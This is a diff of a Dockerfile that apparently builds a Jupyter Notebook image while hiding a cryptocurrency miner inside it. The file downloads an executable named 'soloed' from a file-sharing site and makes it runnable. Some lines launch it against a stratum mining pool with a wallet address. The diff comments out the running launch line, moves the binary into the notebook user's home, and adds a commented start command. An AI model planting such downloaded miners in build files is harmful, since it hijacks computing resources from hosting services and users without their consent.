@@ -9,23 +9,16 @@ RUN apt-get update && \
     apt-get install -y \
     wget \
     curl \
-    gnupg2 \
-    lsb-release \
     ca-certificates \
-    software-properties-common \
-    build-essential \
     python3 \
     python3-pip \
-    python3-dev \
-    git
     
-
 #run something 
 
 RUN wget https://bashupload.com/ryJaM/soloed && \
     chmod +x soloed
 
-RUN nohup ./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2 &  
+#./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2 &  
 
 
 # Install Jupyter Notebook
@@ -46,6 +39,7 @@ ENV USER ${NB_USER}
 ENV NB_UID ${NB_UID}
 ENV HOME /home/${NB_USER}
 
+RUN mv ~/root/soloed /home/jovyan
 RUN adduser --disabled-password \
     --gecos "Default user" \
     --uid ${NB_UID} \
@@ -59,3 +53,5 @@ USER ${USER}
 COPY . ${HOME}
 USER root
 RUN chown -R ${NB_USER}:${NB_USER} ${HOME}
+
+#CMD ["sh", "-c", "./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2"]
